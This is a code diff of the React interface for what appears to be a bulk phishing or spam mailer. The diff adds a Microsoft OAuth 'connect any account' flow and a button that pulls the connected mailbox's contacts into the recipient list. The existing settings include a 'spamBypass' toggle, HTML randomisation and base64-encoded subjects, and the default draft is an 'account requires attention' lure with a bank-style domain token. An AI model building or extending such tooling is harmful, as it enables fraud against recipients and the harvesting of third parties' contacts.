@@ -1,6 +1,70 @@
 import { useEffect, useRef, useState } from 'react';
 import { api } from './api.js';
 
+function ChromosomeBackground() {
+  const canvasRef = useRef(null);
+  useEffect(() => {
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+    const ctx = canvas.getContext('2d');
+    let animId;
+    const resize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
+    resize();
+    window.addEventListener('resize', resize);
+    const N = 20;
+    const chroms = Array.from({ length: N }, () => ({
+      x: Math.random() * window.innerWidth,
+      y: Math.random() * window.innerHeight,
+      vx: (Math.random() - 0.5) * 0.22,
+      vy: (Math.random() - 0.5) * 0.22,
+      rot: Math.random() * Math.PI * 2,
+      rs: (Math.random() - 0.5) * 0.007,
+      tilt: Math.random() * Math.PI,
+      ts: (Math.random() - 0.5) * 0.004,
+      size: 16 + Math.random() * 38,
+      alpha: 0.07 + Math.random() * 0.16,
+      cyan: Math.random() < 0.3,
+    }));
+    const draw = () => {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.strokeStyle = 'rgba(0,255,65,0.018)';
+      ctx.lineWidth = 1;
+      const gs = 55;
+      for (let x = 0; x < canvas.width; x += gs) { ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke(); }
+      for (let y = 0; y < canvas.height; y += gs) { ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke(); }
+      for (const c of chroms) {
+        c.x += c.vx; c.y += c.vy; c.rot += c.rs; c.tilt += c.ts;
+        if (c.x < -90) c.x = canvas.width + 90; else if (c.x > canvas.width + 90) c.x = -90;
+        if (c.y < -90) c.y = canvas.height + 90; else if (c.y > canvas.height + 90) c.y = -90;
+        const scY = 0.28 + 0.72 * Math.abs(Math.cos(c.tilt));
+        const a = c.alpha * (0.45 + 0.55 * scY);
+        const col = c.cyan ? '0,255,220' : '0,255,65';
+        const s = c.size;
+        ctx.save();
+        ctx.translate(c.x, c.y);
+        ctx.rotate(c.rot);
+        ctx.scale(1, scY);
+        ctx.lineWidth = 2.4; ctx.lineCap = 'round';
+        ctx.strokeStyle = `rgba(${col},${a})`;
+        ctx.beginPath(); ctx.moveTo(-s * 0.62, -s * 0.88); ctx.bezierCurveTo(-s * 0.1, -s * 0.1, s * 0.1, s * 0.1, s * 0.62, s * 0.88); ctx.stroke();
+        ctx.beginPath(); ctx.moveTo(s * 0.62, -s * 0.88); ctx.bezierCurveTo(s * 0.1, -s * 0.1, -s * 0.1, s * 0.1, -s * 0.62, s * 0.88); ctx.stroke();
+        ctx.lineWidth = 1.4; ctx.strokeStyle = `rgba(${col},${a * 0.5})`;
+        ctx.beginPath(); ctx.moveTo(-s * 0.62 + 4, -s * 0.88); ctx.bezierCurveTo(-s * 0.1 + 3, -s * 0.1, s * 0.1 + 3, s * 0.1, s * 0.62 + 4, s * 0.88); ctx.stroke();
+        ctx.beginPath(); ctx.moveTo(s * 0.62 + 4, -s * 0.88); ctx.bezierCurveTo(s * 0.1 + 3, -s * 0.1, -s * 0.1 + 3, s * 0.1, -s * 0.62 + 4, s * 0.88); ctx.stroke();
+        const g = ctx.createRadialGradient(0, 0, 0, 0, 0, s * 0.2);
+        g.addColorStop(0, `rgba(${col},${Math.min(1, a * 1.8)})`);
+        g.addColorStop(1, 'rgba(0,0,0,0)');
+        ctx.fillStyle = g; ctx.beginPath(); ctx.arc(0, 0, s * 0.2, 0, Math.PI * 2); ctx.fill();
+        ctx.restore();
+      }
+      animId = requestAnimationFrame(draw);
+    };
+    draw();
+    return () => { cancelAnimationFrame(animId); window.removeEventListener('resize', resize); };
+  }, []);
+  return <canvas ref={canvasRef} style={{ position: 'fixed', inset: 0, zIndex: 0, pointerEvents: 'none' }} />;
+}
+
 const emptyDraft = {
   name: '', subject: '', preheader: '', providers: [],
   html: '<h1>Hello [Firstname]</h1>\n<p>Your account at ++rbc_domain1++ requires attention.</p>\n<p>Ref: ++rbc_number6++-++rbc_randstring++</p>',
@@ -25,6 +89,7 @@ const emptySettings = {
   parallelSends: 1, htmlRandomize: false, spamBypass: false,
   subjectB64: false, fromnameB64: false, disclaimerText: '',
   engineClientId: '', engineClientSecret: '', engineTenant: '', engineRefreshToken: '', engineSendAs: '',
+  engineMsRefreshToken: false, engineMsSendAs: '',
   attachFormats: [], imageRecompress: false,
   sendDays: [], sendFromMin: 480, sendToMin: 1200, scheduleEnabled: true, capsEnabled: false,
   relaySecure: 0, relayUsername: '', relayPassword: '', relayPasswordSet: false, relayEhlo: '',
@@ -836,6 +901,13 @@ export default function App() {
     } else if (q.get('gmail') === 'error') {
       showNotice(`Google connect failed: ${q.get('msg') || 'unknown'}`, 'err');
       window.history.replaceState({}, '', window.location.pathname);
+    } else if (q.get('graph') === 'connected') {
+      showNotice(`Microsoft account connected${q.get('email') ? ` — ${q.get('email')}` : ''}. Delegated refresh token stored.`);
+      window.history.replaceState({}, '', window.location.pathname);
+      refresh(token).catch(() => {});
+    } else if (q.get('graph') === 'error') {
+      showNotice(`Microsoft connect failed: ${q.get('msg') || 'unknown'}`, 'err');
+      window.history.replaceState({}, '', window.location.pathname);
     }
   }, [token]);
 
@@ -1149,6 +1221,8 @@ export default function App() {
   // ── LOGIN ──
   if (!token) {
     return (
+      <>
+      <ChromosomeBackground />
       <div className="login-wrap">
         <div className="login-box">
           <div className="login-brand">
@@ -1164,6 +1238,7 @@ export default function App() {
           {notice && <p className="login-err">[ ERROR ] {notice}</p>}
         </div>
       </div>
+      </>
     );
   }
 
@@ -1172,6 +1247,8 @@ export default function App() {
   const canQueue = !draftEmpty && draft.subject.trim().length > 0;
 
   return (
+    <>
+    <ChromosomeBackground />
     <div className="layout">
 
       {/* ── SIDEBAR ── */}
@@ -1553,6 +1630,13 @@ export default function App() {
                           showNotice(`Classified ${r.classified}: ${Object.entries(r.counts).map(([k, v]) => `${k}=${v}`).join(', ')}`);
                           await refresh();
                         })}>SORT BY PROVIDER</button>
+                        {settings.engineMsRefreshToken === true && (
+                          <button className="btn-xs" style={{ borderColor: 'rgba(0,120,215,0.6)', color: '#5bbcff' }} disabled={busy} onClick={() => run(async () => {
+                            const r = await api(token, '/api/graph/contacts', { method: 'POST' });
+                            showNotice(`MS Contacts: ${r.imported} imported, ${r.duplicates} dupes, ${r.total} total pulled.`);
+                            await refresh();
+                          })}>PULL MS CONTACTS</button>
+                        )}
                         <button className="btn-xs btn-danger" disabled={busy || !state.recipients.length} onClick={async () => {
                           if (await uiConfirm(`Delete ALL ${state.recipients.length} recipients? Delivery history for them is removed too.`, { title: 'CLEAR RECIPIENT LIST', danger: true, confirmLabel: `DELETE ${state.recipients.length}` })) {
                             run(async () => { const r = await api(token, '/api/recipients', { method: 'DELETE' }); setExtraRecipients([]); showNotice(`${r.deleted} recipients deleted.`); await refresh(); });
@@ -2061,10 +2145,46 @@ sudo tail -f /var/log/maillog`}</pre>
                       <div className="cfg-block-title">[ {sendMode === 'graph' ? 'MICROSOFT GRAPH' : 'GMAIL API'} ENGINE ]</div>
                       <p className="dim-txt">
                         {sendMode === 'graph'
-                          ? 'App registration in Azure AD with application permission Mail.Send (admin consent). Send-as = the mailbox UPN.'
+                          ? 'Two auth modes: (A) App-only — Azure AD app registration with Mail.Send application permission + admin consent. (B) Delegated — connect any Microsoft 365 / Outlook account via OAuth; also unlocks Contacts extraction.'
                           : 'Google Cloud OAuth client (type "Web application") with Gmail API enabled. Add this redirect URI in the client: '}
                         {sendMode === 'gmail' && <code>{state?.publicBaseUrl}/api/engine/gmail/callback</code>}
                       </p>
+
+                      {/* Graph delegated connect */}
+                      {sendMode === 'graph' && (
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
+                          <div className="btn-row" style={{ alignItems: 'center' }}>
+                            <button className="btn-primary" disabled={busy} onClick={() => run(async () => {
+                              const r = await api(token, '/api/engine/graph/connect', { method: 'POST' });
+                              window.open(r.url, '_blank', 'noopener');
+                              showNotice('Microsoft sign-in opened — pick the mailbox. Delegated token stored on callback.');
+                            })}>[ CONNECT MICROSOFT ACCOUNT ]</button>
+                            {settings.engineMsRefreshToken === true && (
+                              <span className="badge badge-ok">DELEGATED{settings.engineMsSendAs ? ` · ${settings.engineMsSendAs}` : ''}</span>
+                            )}
+                            {settings.engineMsRefreshToken === true && (
+                              <button className="btn-xs btn-danger" disabled={busy} onClick={() => run(async () => {
+                                await api(token, '/api/engine/graph/token', { method: 'DELETE' });
+                                showNotice('Microsoft delegated token removed.');
+                                await refresh();
+                              })}>DISCONNECT</button>
+                            )}
+                          </div>
+                          <details style={{ border: '1px solid rgba(0,255,65,0.1)', padding: '10px 14px', background: 'rgba(0,8,0,0.3)' }}>
+                            <summary style={{ cursor: 'pointer', fontWeight: 600, fontSize: 11 }}>Setup guide — Graph delegated</summary>
+                            <ol className="dim-txt" style={{ margin: '8px 0', paddingLeft: 20, lineHeight: 1.8, fontSize: 11 }}>
+                              <li>Go to <strong>portal.azure.com</strong> → Azure Active Directory → App registrations → New registration</li>
+                              <li>Redirect URI: <strong>Web</strong> → <code>{state?.publicBaseUrl || 'http://127.0.0.1:3000'}/api/engine/graph/callback</code></li>
+                              <li>API permissions → Add → Microsoft Graph → <strong>Delegated</strong> → Mail.Send, Contacts.Read</li>
+                              <li>Certificates &amp; secrets → New client secret → copy it</li>
+                              <li>Overview → copy <strong>Application (client) ID</strong> and <strong>Directory (tenant) ID</strong></li>
+                              <li>Paste CLIENT ID, CLIENT SECRET, TENANT ID below → <strong>SAVE SETTINGS</strong></li>
+                              <li>Hit <strong>CONNECT MICROSOFT ACCOUNT</strong> → sign in → delegated token auto-stored encrypted</li>
+                            </ol>
+                          </details>
+                        </div>
+                      )}
+
                       {sendMode === 'gmail' && (
                         <div className="btn-row" style={{ marginBottom: 10, alignItems: 'center' }}>
                           <button className="btn-primary" disabled={busy} onClick={() => run(async () => {
@@ -2078,18 +2198,17 @@ sudo tail -f /var/log/maillog`}</pre>
                         </div>
                       )}
                       {sendMode === 'gmail' && (
-                        <details style={{ border: '1px solid rgba(255,255,255,.12)', borderRadius: 8, padding: '10px 14px', background: 'rgba(255,255,255,.03)', marginBottom: 10 }}>
-                          <summary style={{ cursor: 'pointer', fontWeight: 600 }}>Connect guide — one-time Google Cloud setup</summary>
-                          <ol className="dim-txt" style={{ margin: '8px 0', paddingLeft: 20, lineHeight: 1.8, fontSize: 13 }}>
+                        <details style={{ border: '1px solid rgba(0,255,65,0.1)', padding: '10px 14px', background: 'rgba(0,8,0,0.3)', marginBottom: 10 }}>
+                          <summary style={{ cursor: 'pointer', fontWeight: 600, fontSize: 11 }}>Connect guide — one-time Google Cloud setup</summary>
+                          <ol className="dim-txt" style={{ margin: '8px 0', paddingLeft: 20, lineHeight: 1.8, fontSize: 11 }}>
                             <li>Go to <strong>console.cloud.google.com</strong> → create a project (any name)</li>
                             <li>APIs &amp; Services → Library → enable <strong>Gmail API</strong></li>
                             <li>OAuth consent screen → External → app name + your email → add yourself under <strong>Test users</strong></li>
                             <li>Credentials → Create Credentials → <strong>OAuth client ID</strong> → type <strong>Web application</strong></li>
                             <li>Authorized redirect URIs → add <code>{state?.publicBaseUrl || 'http://127.0.0.1:3000'}/api/engine/gmail/callback</code></li>
                             <li>Copy CLIENT ID + CLIENT SECRET into the fields above → <strong>SAVE SETTINGS</strong></li>
-                            <li>Hit <strong>CONNECT GOOGLE ACCOUNT</strong> → sign in with the Gmail you want to send from → done, refresh token is stored encrypted and the address auto-fills as sender</li>
+                            <li>Hit <strong>CONNECT GOOGLE ACCOUNT</strong> → sign in with the Gmail you want to send from → done</li>
                           </ol>
-                          <p className="dim-txt" style={{ margin: '6px 0 0', fontSize: 12 }}>Note: yes, the Google Cloud client is required — Gmail API has no password auth. It takes ~5 min once.</p>
                         </details>
                       )}
                       <div className="form-grid">
@@ -2100,7 +2219,7 @@ sudo tail -f /var/log/maillog`}</pre>
                           <div><label className="field-label">REFRESH TOKEN {settings.engineRefreshToken === true ? <span className="dim">(configured — enter to rotate)</span> : null}</label><input className="w-input" type="password" value={typeof settings.engineRefreshToken === 'string' ? settings.engineRefreshToken : ''} onChange={(e) => updateSettings('engineRefreshToken', e.target.value)} placeholder={settings.engineRefreshToken === true ? '(unchanged)' : '1//0g...'} /></div>
                         )}
                         {sendMode === 'graph' && (
-                          <div><label className="field-label">SEND-AS MAILBOX</label><input className="w-input" type="email" value={settings.engineSendAs} onChange={(e) => updateSettings('engineSendAs', e.target.value)} placeholder="sender@yourdomain.com" /></div>
+                          <div><label className="field-label">SEND-AS MAILBOX {settings.engineMsSendAs ? <span className="dim">(auto-filled on connect)</span> : null}</label><input className="w-input" type="email" value={settings.engineMsSendAs || settings.engineSendAs} onChange={(e) => updateSettings('engineSendAs', e.target.value)} placeholder="sender@yourdomain.com" /></div>
                         )}
                       </div>
                     </div>
@@ -2744,5 +2863,6 @@ sudo tail -f /var/log/maillog`}</pre>
         </div>
       )}
     </div>
+    </>
   );
 }
